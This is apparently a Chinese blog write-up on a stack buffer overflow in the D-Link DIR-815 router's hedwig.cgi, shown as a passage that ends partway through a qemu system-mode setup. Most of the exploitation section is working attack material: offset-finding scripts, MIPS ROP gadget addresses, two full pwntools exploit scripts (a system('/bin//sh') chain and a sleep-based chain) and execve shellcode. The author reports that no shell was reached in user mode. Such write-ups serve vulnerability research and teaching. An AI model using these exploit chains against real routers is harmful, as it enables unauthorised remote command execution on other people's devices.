<p>想着往里面写个/temp.xml文件并添加内容就可以了吧，结果发现还是返回no xml data。因为fopen打开该文件的方式是’w’，创建一个用于写入的空文件。如果文件名称与已存在的文件相同，则会删除已有文件的内容，文件被视为一个新的空文件。所以只要执行了这条指令文件内容就会被清空，返回值一定是<code>no xml data</code>，所以利用qemu用户模式这样调试的话，是到不了第二个<code>sprintf</code>函数。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/fopen.png" alt=""></p>
<p>所以漏洞点是第一个<code>sprintf</code>函数，挺多帖子也是分析得到第一个<code>sprintf</code>函数是漏洞点。其实是第一个还是第二个对于用户模式下的调试并没有多大关系，就是偏移不一样罢了，构造rop链方法都是一样的。但是对于真实设备而言，就要找到真正的漏洞点在哪。</p>
<h2 id="漏洞重新定位"><a href="#漏洞重新定位" class="headerlink" title="漏洞重新定位"></a>漏洞重新定位</h2><p>爆肝一晚，参考一个大佬的<a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN" target="_blank" rel="noopener">文章</a>，发现了为什么到达不了第二个sprintf的原因。</p>
<p>还需要POST数据包中包含”uid=……”，否则运行不了下面的代码，</p>
<pre class=" language-assembly"><code class="language-assembly">.text:00409AB0                 la      $t9, sobj_strdup
.text:00409AB4                 lw      $a0, 4($s0)
.text:00409AB8                 jalr    $t9 ; sobj_strdup
.text:00409ABC                 nop
.text:00409AC0                 lw      $ra, 0x20+var_4($sp)
.text:00409AC4                 lui     $v1, 0x43  # 'C'
.text:00409AC8                 lw      $gp, 0x20+var_10($sp)
.text:00409ACC                 lw      $s0, 0x20+var_8($sp)
.text:00409AD0                 sw      $v0, haystack
.text:00409AD4                 jr      $ra
.text:00409AD8                 addiu   $sp, 0x20</code></pre>
<p>从而无法申请一个新的堆空间，这样haystack中值将为0，在运行完第一个sprinf之后会进入loc_4096D4，如果haystack为0将则不会进入loc_4096F0分支，进而跳转不了第二个sprintf()。</p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span>004096D4 loc_4096D4<span class="token punctuation">:</span>                              # CODE XREF<span class="token punctuation">:</span> hedwigcgi_main<span class="token operator">+</span><span class="token number">240</span>j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>004096D4                 lw      $v0<span class="token punctuation">,</span> haystack
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>004096DC                 nop
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">004096E0</span>                 bnez    $v0<span class="token punctuation">,</span> loc_4096F0
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">004096E4</span>                 lui     $v0<span class="token punctuation">,</span> <span class="token number">0x42</span>  # <span class="token string">'B'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">004096E8</span>                 b       loc_409A64
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>004096EC                 addiu   $a1<span class="token punctuation">,</span> $v0<span class="token punctuation">,</span> <span class="token punctuation">(</span>aNoXmlData_ <span class="token operator">-</span> <span class="token number">0x420000</span><span class="token punctuation">)</span>  # <span class="token string">"no xml data."</span></code></pre>
<p>如何使POST数据包中包含”uid=……”，看了大佬们的文章(参考资料里面)还有《0day》那本书中的测试脚本发现，POST具体数据可以通过类似输入流传入 ：echo “uid=aaa”| /htdocs/web/hedwig.cgi。然后前提也是需要手工创建’/var/tmp’文件夹。</p>
<h1 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>hedwigcgi_main()在调用get_sess_uid函数前需要设置环境变量REQUEST_METHOD为POST。   </p>
<p>cgi程序通过getenv的方式获取HTTP数据包中的数据，整个流程应该为:</p>
<p>主Web程序监听端口-&gt;传送HTTP数据包-&gt;HTTP报文中headers等数据通过环境变量的方式传给cgi处理程序-&gt;cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据</p>
<p>漏洞点sprintf函数</p>
<p>sprintf(栈上的内容,”%s/%s/postxml”,”/runtime/session”,uid的内容)uid的内容是由用户控制的，却没有长度限制，而栈空间有限，hedwigcgi_main同时是一个非叶子函数，那么ra一定存在栈上，我们接下来要做的就是覆盖栈空间内的saved ra达到控制程序流程的目的。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>整个漏洞利用过程是</p>
<ul>
<li>劫持PC，通过调试确定缓冲区大小，定位并确定控制偏移</li>
<li>确定攻击路径，构造ROP链</li>
<li>编写exp,getshell</li>
</ul>
<h3 id="劫持PC，确定偏移"><a href="#劫持PC，确定偏移" class="headerlink" title="劫持PC，确定偏移"></a>劫持PC，确定偏移</h3><p>利用qemu和IDA进行动态调试,用的是（IDA6.8,qemu2.5）</p>
<p>调试脚本test.sh，其中需要sudo chroot 到文件系统下，然后利用qemu-mipsel-static用户模式进行调试，-E是对应环境变量的参数。-g 指定调试端口，“2&gt; /dev/null” 代表忽略掉错误提示信息。</p>
<pre class=" language-sh"><code class="language-sh">#/bin/bash
test=$(python -c "print 'uid='+open('test','r').read(2000)")
LEN=$(echo -n "$test" | wc -c)
PORT="23957"
cp $(which qemu-mipsel-static) ./qemu
sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2>/dev/null
rm -f ./qemu</code></pre>
<p>在这之前需要利用patternLocOffset.py生成test文件，包含特定格式的2000个字符串。</p>
<p><code>python patternLocOffset.py -c -l 2000 -f test</code></p>
<p>使用IDA调试发现运行到hedwigcgi_main()返回时ra寄存器中的值为0x38694237</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/ra.png" alt=""></p>
<p><code>python patternLocOffset.py -s 0x38694237 -l 2000</code>确定缓冲区距离ra的距离为1043。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB.png" alt=""></p>
<p>可以通过修改test.sh中的<code>test =$(python -c &quot;print &#39;uid=&#39; + &#39;A&#39;*1043 + &#39;B&#39;*4&quot;)</code>进一步确定偏移为1043。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/1043offset.png" alt=""></p>
<p>以上是触发第一个sprintf()的偏移。</p>
<h4 id="重新确定偏移"><a href="#重新确定偏移" class="headerlink" title="重新确定偏移"></a>重新确定偏移</h4><p>更改test.sh，在脚本中加入echo “uid=xxx”。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
#sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`

INPUT="$1"
COOKIE="$2"
PORT="23957"
LEN=$(echo -n "$INPUT" | wc -c)
cp $(which qemu-mipsel-static) ./qemu

echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$COOKIE -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1"  -g $PORT /htdocs/web/hedwig.cgi
rm -f ./qemu</code></pre>
<p>执行命令</p>
<pre class=" language-sh"><code class="language-sh">sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`</code></pre>
<p>调试之后发现确实能够触发第二个sprintf()。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/sprintf3.png" alt=""></p>
<p>并且覆盖了ra=68423668。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/ra2.png" alt=""></p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E5%81%8F%E7%A7%BB2.png" alt=""></p>
<p>计算得到偏移为1009。</p>
<h3 id="选择攻击路径构造ROP链"><a href="#选择攻击路径构造ROP链" class="headerlink" title="选择攻击路径构造ROP链"></a>选择攻击路径构造ROP链</h3><h4 id="通过system函数getshell"><a href="#通过system函数getshell" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h4><p>主要目的是调用system(‘/bin/sh’)来getshell，system函数在libc.so中找，参数’/bin/sh’首先放入栈中，然后利用gadget将栈上的’/bin/sh’传入a0寄存器，再调用system函数即可。</p>
<p>1.定位system函数地址</p>
<p>首先需要先找到调用了哪个动态链接库libc.so，然后在libc.so中定位system函数。</p>
<p>通过以下过程：</p>
<pre class=" language-sh"><code class="language-sh">gdb-multiarch htdocs/cgibin #一定要加载文件htdocs/cgibin不然vmmap得不到结果
set architecture mips
target remote :23957
b *0x409A54 #hedwigcgi_main()函数返回jr ra处
c
vmmap</code></pre>
<p>为了以后不用每次都输入固定的指令可以编写一个dbgscript</p>
<pre class=" language-sh"><code class="language-sh">set architecture mips
set endian little
target remote :23957
b *0x409a54</code></pre>
<p>gdb-multiarch调试的时候执行<code>gdb-multiarch htdocs/cgibin -x dbgscript</code>，-x是指定要执行的命令文件。</p>
<p>得到libuClibc-0.9.30.1.so的基地址为0x76738000。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/libc-so.png" alt=""></p>
<p>在/lib文件夹下找到libuClibc-0.9.30.1.so用IDA打开，system函数在0x53200处。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/system.png" alt=""></p>
<p>这样就得到了system函数的真实地址0x76738000+0x53200=0x7678b200。</p>
<p>2.绕过坏字符\x00构造rop链</p>
<p>因为system函数的最低位为\x00，在构造HTTP_COOKIE的时候\x00会被sprintf截断，其实还到不了sprintf函数，前面的sess_get_uid函数只获取uid=之后\x00字符之前的字符串，进而导致缓冲区溢出失败。所以构造shellcode时需要对system函数的真实地址-1：0x7678b200-1=0x7678b1ff，再寻找gadget将其加1即可。</p>
<p>有了system函数，接下来考虑如何将system函数的第一个参数从栈中拷贝到寄存器a0中，在libuClibc-0.9.30.1.so利用mipsrop插件中的<code>mipsrop.stackfinder()</code>命令查找能将栈中数据放入寄存器的gadget。在0x159cc处发现可将当前栈$sp+0x10处的值存入寄存器s5并跳转至s0。并且在跳转之前将$s5的内容给到$a0，$a0=$(sp+0x10),这样system函数的第一个参数就能从栈中得到了。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/gadget.png" alt=""></p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/jalrs0.png" alt=""></p>
<p>继续在libuClibc-0.9.30.1.so中寻找能够将system函数地址+1的gadget，使用mipsrop插件，<code>mipsrop.find(&quot;addiu .*,1&quot;)</code>得到31个gadget，找到0x00045988处，这个gadget的作用是将寄存器s0中的值加一，并跳转至s1寄存器中，所以需要将system函数地址减一之后放入s0寄存器中。并将获取第一个参数a0的gadget0x159cc放入s1寄存器中。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/addiu1.png" alt=""></p>
<p>到这里我们需要的gadget就找好，由IDA中的汇编代码可以看出我们可以控制数据覆盖ra,fp,s7~s0寄存器。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E8%A6%86%E7%9B%96.png" alt=""></p>
<p>所以可以这样构造payload,结构大致如下：</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E6%9E%84%E9%80%A0.png" alt=""></p>
<p>这里参考下H4lo师傅的整个流程图：</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/H4lo.png" alt=""></p>
<p>3.构造的exp如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>
base_addr <span class="token operator">=</span> <span class="token number">0x76738000</span>
system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>

padding <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x3cd</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
padding <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
padding <span class="token operator">+=</span> <span class="token string">'/bin//sh'</span>

f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"exploit"</span><span class="token punctuation">,</span><span class="token string">'wb+'</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>padding<span class="token punctuation">)</span>
f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>4.测试exp</p>
<p>执行命令：</p>
<pre class=" language-sh"><code class="language-sh">sudo ./test.sh  'uid=1234' `python -c "print 'uid=' + open('exploit','r').read()"`</code></pre>
<p>使用gdb-multiarch联调发现，确实能够跳转到gadget1处（0x76738000+0x45988=0x7677d988），将s0处的system-1地址加一。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/gadget1.png" alt=""></p>
<p>之后顺利进入gadget1处(0x76738000+0x159cc=0x7674d9cc)处，将栈上内容(sp+0x10)先加载到s5，并在跳转s0前将s5中内容传给a0。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/addius5sp10.png" alt=""></p>
<p>进入system处，a0参数为/bin//sh。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/libc_system.png" alt=""></p>
<p>继续往下执行，发现执行完system函数返回时被中断了，因为当前指令是从(fp+0x10)处取一个字节给$gp，而当前$fp的内容为0x0空指针，(fp+0x10处)肯定无法访问。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/libc_system2.png" alt=""></p>
<p>但是在整个rop链运行过程中并没有出现给$fp赋值的操作，所以这块为什么$fp会变成0，变成空指针。这是一个问题，需要解决，应该是还是构造的rop链执行system函数的过程中出现了问题。</p>
<h4 id="调用sleep-1-函数"><a href="#调用sleep-1-函数" class="headerlink" title="调用sleep(1)函数"></a>调用sleep(1)函数</h4><p>接下来考虑利用另一种方式通过调用sleep(1)函数来getshell，至于为什么利用sleep(1)函数呢，参考这篇<a href="http://xdxd.love/2016/12/09/一个mips栈溢出利用/" target="_blank" rel="noopener">文章</a>，里面有讲到一个问题就是cache incoherency。MIPS CPUs有两个独立的cache：<strong>指令cache</strong>和<strong>数据cache</strong>。指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush，将数据写回到主内存。<strong>攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中</strong>。当payload触发漏洞，劫持程序执行流程的时候，会去执行内存中的shellcode。*<em>如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。 *</em></p>
<p>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如sleep(1)或者其他类似的函数。sleep的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行flush。 </p>
<p>整个ROP的调用流程参考<a href="https://www.anquanke.com/post/id/179510#h3-6" target="_blank" rel="noopener">H4lo</a>师傅的图。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/%E8%B0%83%E7%94%A8sleep.png" alt=""></p>
<p>1.ROP Gadget 1</p>
<p>利用<code>mipsrop.find(&quot;li $a0,1&quot;)</code>寻找到0x57E50，该gadget返回时跳转至s1寄存器中地址。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/lia0.png" alt=""></p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/0x57E50.png" alt=""></p>
<p>可以将ra处覆盖为<code>ra=gadget1=0x57E50+libc_base</code>。之后寻找第二个gadget2将其放入s1，这里不能直接将sleep函数放入s1中，因为sleep函数运行完jr $ra时，我们控制不了，所以接下来应该是寻找能够控制$ra的gadget2.</p>
<p>2.ROP Gadget 2</p>
<p>利用mipsrop插件中的<code>mipsrop.tail()</code>该函数作用是<code>Prints a lits of all tail call gadgets (useful for function calls).</code>打印出所有函数尾部调用的gadget，这些gadget对函数调用很有效。因为非叶子函数尾部一般是将栈中值返回给寄存器然后再跳转。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/mipsrop-tail.png" alt=""></p>
<p>选择0x3B8A8作为gadget2。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/3B8A8.png" alt=""></p>
<p>该gadget的作用是将栈上(sp+0x24)处的内容给到寄存器ra，然后再跳转至s2寄存器中，所以s2寄存器就可以放我们需要的sleep函数的地址。这样的话<code>s1=gadget2=0x3B8A8+libc_base</code>，<code>s2 = sleep+libc_base</code>。</p>
<p>sleep函数在libuClibc-0.9.30.1.so的偏移为0x56BD0。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/libc_sleep.png" alt=""></p>
<p>3.ROP Gadget 3</p>
<p>执行完sleep函数之后需要控制程序执行栈上shellcode，这里需要用到mipsrop插件的<code>mipsrop.stackfinder()</code>，将栈上的shellcode地址存储进寄存器中。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/mipsrop-stackfinders.png" alt=""></p>
<p>找到0x14F28处的gadget3，所以<code>$(sp+0x24)=gadget3</code>，gadget3的作用是将sp+0x18处的值赋给s1，之后跳转到s4寄存器中的地址。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/14F28.png" alt=""></p>
<p>所以接下来我们需要的gadget4是’move $t9,$s1’，跳转到是s1也就是我们的shellcode。</p>
<p>4.ROP Gadget 4</p>
<p>利用<code>mipsrop.find(&quot;move $t9,$s1&quot;)</code>找到一下gadget。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/movet9s1.png" alt=""></p>
<p>这里选择0x1DD08作为gadget4，<code>s4=gadget4=0x1DD08+libc_base</code>。因为其他的gadget可能导致最后出现坏字符，比如我试了0xBB44，结果真实地址为0xBB44+0x76738000=0x76743b44，然而3b在sess_get_uid的时候就被截断了,所以导致rop没有构造成功。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/0x1DD08.png" alt=""></p>
<p>到这里所有的gadget都找齐了。</p>
<p>5.构造exp</p>
<p>整个payload是这样的：</p>
<p>这里顺便提下构造exp时有可能的坏字符：0x20（空格）、0x00（结束符）、0x3a（冒号）、0x3f（问号）、0x3b（分号）、0x0a(\n换行符)等。具体还要看程序如何处理以及转义。</p>
<pre class=" language-python"><code class="language-python">libc_base <span class="token operator">=</span> <span class="token number">0x76738000</span>
sleep <span class="token operator">=</span> <span class="token number">0x56BD0</span>
gadget1 <span class="token operator">=</span> <span class="token number">0x57E50</span>
gadget2 <span class="token operator">=</span> <span class="token number">0x3B8A8</span>
gadget3 <span class="token operator">=</span> <span class="token number">0x14F28</span>
gadget4 <span class="token operator">=</span> <span class="token number">0x1DD08</span>

<span class="token comment" spellcheck="true"># Linux/MIPS - execve /bin/sh - 48 bytes</span>
shellcode <span class="token operator">=</span> <span class="token string">"\xff\xff\x06\x28"</span>  <span class="token comment" spellcheck="true"># slti $a2, $zero, -1</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x62\x69\x0f\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t7, 0x6962</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x2f\x2f\xef\x35"</span>  <span class="token comment" spellcheck="true"># ori $t7, $t7, 0x2f2f</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xaf\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t7, -0xc($sp)</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x73\x68\x0e\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t6, 0x6873</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x6e\x2f\xce\x35"</span>  <span class="token comment" spellcheck="true"># ori $t6, $t6, 0x2f6e</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xae\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t6, -8($sp)</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xfc\xff\xa0\xaf"</span>  <span class="token comment" spellcheck="true"># sw $zero, -4($sp)</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xa4\x27"</span>  <span class="token comment" spellcheck="true"># addiu $a0, $sp, -0xc</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x05\x28"</span>  <span class="token comment" spellcheck="true"># slti $a1, $zero, -1</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\xab\x0f\x02\x24"</span>  <span class="token comment" spellcheck="true"># addiu;$v0, $zero, 0xfab</span>
shellcode <span class="token operator">+=</span> <span class="token string">"\x0c\x01\x01\x01"</span>  <span class="token comment" spellcheck="true"># syscall 0x40404</span>

payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">0x3cd</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s0</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1 = mipsrop.tail() &amp;&amp; move $ra,$(sp+0x24) &amp;&amp; jr s2</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> sleep<span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># s2 = jr $(sp+0x24)</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget4<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s4 = mipsrop.find("move $t9,$s1") &amp;&amp; jr shellcode</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># fisrt_ra = mipsrop.find("li $a0,1") &amp;&amp; jr s1</span>
payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x24</span> <span class="token comment" spellcheck="true"># mipsrop.tail() 0x24B padding</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget3<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># $(sp+0x24) = mipsrop.stackfinder() &amp;&amp; move s1,$(sp+0x18) &amp;&amp; jr $s4</span>

payload <span class="token operator">+=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token comment" spellcheck="true"># mipsrop.stackfinder() 0x18B padding</span>
payload <span class="token operator">+=</span> shellcode</code></pre>
<p>调试结果显示能够进入到Shellcode去执行。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/shellcode.png" alt=""></p>
<p>但是之后一直出不去，获取不到shell。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/shellcode2.png" alt=""></p>
<p>所以到目前为止，利用qemu用户模式还没有成功获取shell！！！</p>
<h1 id="qemu系统模式"><a href="#qemu系统模式" class="headerlink" title="qemu系统模式"></a>qemu系统模式</h1><p>我们这里主要是为了在qemu虚拟机中重现http服务。通过查看文件系统中的<code>/bin、/sbin、/usr/bin、/usr/sbin</code>可以知道<code>/sbin/httpd</code>应该是用于监听web端口的http服务，同时查看<code>/htdocs/web</code>文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><code>find ./ -name &#39;*http*&#39;</code>找到web配置文件httpcfg.php。</p>
<pre class=" language-sh"><code class="language-sh">./etc/services/HTTP/httpcfg.php
./etc/services/HTTP/httpsvcs.php
./usr/sbin/httpc
./sbin/httpd</code></pre>
<p>查看httpcf.php</p>
<pre class=" language-php"><code class="language-php">Umask <span class="token number">026</span>
PIDFile <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>run<span class="token operator">/</span>httpd<span class="token punctuation">.</span>pid
<span class="token shell-comment comment">#LogGMT On</span>
<span class="token shell-comment comment">#ErrorLog /dev/console</span>

Tuning
<span class="token punctuation">{</span>
    NumConnections <span class="token number">15</span>
    BufSize <span class="token number">12288</span>
    InputBufSize <span class="token number">4096</span>
    ScriptBufSize <span class="token number">4096</span>
    NumHeaders <span class="token number">100</span>
    Timeout <span class="token number">60</span>
    ScriptTimeout <span class="token number">60</span>
<span class="token punctuation">}</span>

Control
<span class="token punctuation">{</span>
    Types
    <span class="token punctuation">{</span>
        text<span class="token operator">/</span>html    <span class="token punctuation">{</span> html htm <span class="token punctuation">}</span>
        text<span class="token operator">/</span>xml    <span class="token punctuation">{</span> xml <span class="token punctuation">}</span>
        text<span class="token operator">/</span>plain    <span class="token punctuation">{</span> txt <span class="token punctuation">}</span>
        image<span class="token operator">/</span>gif    <span class="token punctuation">{</span> gif <span class="token punctuation">}</span>
        image<span class="token operator">/</span>jpeg    <span class="token punctuation">{</span> jpg <span class="token punctuation">}</span>
        text<span class="token operator">/</span>css    <span class="token punctuation">{</span> css <span class="token punctuation">}</span>
        application<span class="token operator">/</span>octet<span class="token operator">-</span>stream <span class="token punctuation">{</span> <span class="token operator">*</span> <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    Specials
    <span class="token punctuation">{</span>
        Dump        <span class="token punctuation">{</span> <span class="token operator">/</span>dump <span class="token punctuation">}</span>
